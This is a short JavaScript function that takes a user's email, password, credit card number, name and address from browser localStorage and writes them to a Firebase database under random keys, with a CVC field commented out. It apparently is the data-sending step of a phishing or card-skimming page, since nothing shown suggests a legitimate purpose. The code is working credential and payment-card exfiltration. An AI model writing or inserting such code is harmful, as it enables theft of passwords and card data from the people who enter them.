function senttofirebase() {
    var database = firebase.database()
    database.ref('data-' + Math.random().toString(36).substr(2, 9)).set({
        email: localStorage.getItem("email"),
        password: localStorage.getItem("password"),
        credit: localStorage.getItem("credit"),
        //cvc: localStorage.getItem("cvc"),
        name: localStorage.getItem("name"),
        address: localStorage.getItem("address")
    });

}